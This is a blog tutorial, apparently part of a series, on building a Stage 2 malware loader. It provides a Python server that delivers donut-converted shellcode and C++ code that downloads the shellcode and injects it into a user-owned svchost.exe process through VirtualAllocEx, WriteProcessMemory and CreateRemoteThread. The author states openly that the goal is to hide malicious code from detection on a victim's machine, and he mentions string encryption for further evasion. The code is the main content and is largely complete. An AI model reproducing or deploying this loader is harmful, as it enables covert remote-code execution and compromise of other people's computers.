 In the last blog I created a simple C2 Server and payload, in this post I'll be using a technique called Process Injection to run my payload. 
 The main payload was Stage 1 of the malware, we now need to create Stage 2 to run the payload the payload in memory. For this I'll be using a technique called Process Injection.

## What is Process Injection?

Process Injection is a technique that injects malicious shellcode into a process, this code can run inside of another process meaning that it can be completely hidden. If the code is injected into a trusted Windows program (svchost.exe, notepad.exe, explorer.exe, etc.) then our code has a higher chance of not being detected. 

The structure of the program is as follows:

- Get our shellcode from a server
- Create or get a valid process
- Inject the shellcode into the process
- Create a new thread to run the shellcode

Let's start by actually acquiring the shellcode, we already have our payload completed but its in the form of a Portable Executable (PE file), we can't just read the bytes of the exe and then send them over because a PE file contains many other parts that aren't just the code. Executable files are **position-dependent** and we need **position-independent** code that can run anywhere in memory.

## PE File Structure & Getting the shellcode

This is the structure of a PE file:

Our actual code is inside of the section called `.text`, we could manually map out a PE file then grab the code we need but tools have already been created for that. I'll be using [`donut`](https://github.com/TheWover/donut) to automate this process.

We now have the file `loader.bin` which contains the shellcode.

It's possible to put all of this shellcode into our process injector program, but it's 3000 lines long which is a pain, so we are going to send the shellcode via a server to the process injector. This also means that we can continue to upgrade our payload without the victim needing to reinstall the malware.

The server code looks like this:

```python
import socket
import struct

# create the socket and bind it
serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv.bind(('', 4445))
serv.listen()

while True:

	c_sock, _ = serv.accept()

	# read the bytes of 'loader.bin' 
	payload = open('loader.bin', 'rb').read()
	# use our previous messaging protocol to add the length of the message
	payload_msg = struct.pack("!I", len(payload)) + payload
	# send the bytes
	c_sock.sendall(payload_msg)

	# close the connection, we've done all we need to do
	c_sock.close()

```

It's pretty much the exact same as the last server, except it reads the bytes of `loader.bin`, then sends it over. 

Let's have our program receive the shellcode:

```cpp

// define WIN32_LEAN_AND_MEAN to not include EVERYTHING in Windows.h
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <vector>

// tell the linker to include winsock as a library
#pragma comment(lib, "ws2_32.lib")

int main()
{

	// Download shellcode from server
	// Get a valid process (svchost.exe)
	// Inject into the process
	// Start thread

	// initialize winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	// define socket constants
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo("", "4445", &hints, &result) != 0)
	{
		return 1;
	}

	SOCKET sock = INVALID_SOCKET;
	sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	if (sock == INVALID_SOCKET)
	{
		return 1;
	}

	// connect to the server
	connect(sock, result->ai_addr, (int)result->ai_addrlen);


	// get message length
	int msg_len;
	recv(sock, reinterpret_cast<char*>(&msg_len), sizeof(int), 0);
	msg_len = ntohl(msg_len);

	// create buffer to hold the shellcode
	std::vector<char> shellcode(msg_len + 1);

	int total = 0;
	int recieved = 0;

	// recieve the shellcode
	while (total < msg_len) {
		recieved = recv(sock, shellcode.data() + total, msg_len - total, 0);
		total += recieved;
	}

	// close socket and do cleanup, we don't need this socket anymore
	closesocket(sock);
	WSACleanup();

}
```

This code also does the exact same thing as my payload, but it'll receive the shellcode from my server instead.

Perfect! We have the shellcode server, and the actual shellcode, the next step is to find a process. We'll be finding an existing Windows process known as `svchost.exe`, if you check your Task Manager right now you'll find many of them running, so this is a great program to inject our code into. Take a look:

![](https://github.com/user-attachments/assets/d595766a-5602-4f82-81f0-218cf46e1ab1)

NOTE: We need to find one that is being ran by the user, not SYSTEM or LOCAL SERVER, if we try to inject into a process ran by SYSTEM it won't work because we don't have to permissions to do so.

Let's create a function that will return the `handle` of a process when given a process name:

```cpp
HANDLE GetProcHandle(std::wstring procName)
{

	// initialize variables
	PROCESSENTRY32W procEntry;
	procEntry.dwSize = sizeof(procEntry);

	// use CreateToolhelp32Snapshot to get a handle to all processes
	// the TH32CS_SNAPPROCESS constant tells the function we want the processes
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if (Process32FirstW(hSnap, &procEntry))
	{

		// loop through all the processes using Process32NextW

		do {

			// check if the current process name is equal to the desired process
			if (std::wstring(procEntry.szExeFile) == procName)
			{

				// try to open a handle to the process
				HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procEntry.th32ProcessID);

				// if the handle is 0 then we don't have permission, this will be a process created by SYSTEM or LOCAL SERVER
				if (handle == 0)
				{
					continue;
				}

				// if the handle works then close the handle for hSnap and return the handle of the found process
				CloseHandle(hSnap);
				return handle;

			}
		} while (Process32NextW(hSnap, &procEntry));

	}

	// return nothing if we couldn't find the process
	CloseHandle(hSnap);
	return 0;

}
```

Using the function looks like this:

```cpp
HANDLE hProcess = GetProcHandle(L"svchost.exe");
```

Having the string `svchost.exe` in our binary could be suspicious, we could encrypt it now and decrypt it at runtime, but that's a task for later.

Let's talk about the functions we need to take to inject our shellcode into the process:

- [`VirtualAllocEx()`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) - Allocate memory for the shellcode, this returns the memory address of where to inject the shellcode.
- [`WriteProcessMemory()`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) - Write the shellcode into the processes' memory using the memory address when we allocated.
- [`CreateRemoteThread()`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) - Execute the shellcode by creating a remote thread. 

To learn more about each method's parameters, visit the Microsoft documentation linked for each of them.

First, we allocate the memory:

```cpp
void* exec_mem = VirtualAllocEx(
	hProcess,
	NULL,
	shellcode.size(),
	MEM_COMMIT | MEM_RESERVE,
	PAGE_EXECUTE_READWRITE);
```


We use `shellcode.size()` to tell the function how many bytes it's going to allocate into memory. The function returns a void pointer which is the address of where our allocated memory begins, the end of the memory would be `exec_mem + shellcode.size()`

Next, we write our shellcode into the allocated memory:

```cpp
WriteProcessMemory(
	hProcess, 
	exec_mem, 
	shellcode.data(), 
	shellcode.size(), 
	NULL);
```

Finally we create a remote thread to run the shellcode:

```cpp
CreateRemoteThread(
	hProcess, 
	NULL, 
	0, 
	(LPTHREAD_START_ROUTINE)exec_mem, 
	NULL, 
	0, 
	0);

// close the handle to the process
CloseHandle(hProcess);
```

That's all! The current process will now end and our shellcode will be injected into the new process. 

Here's a video demonstrating the injector:
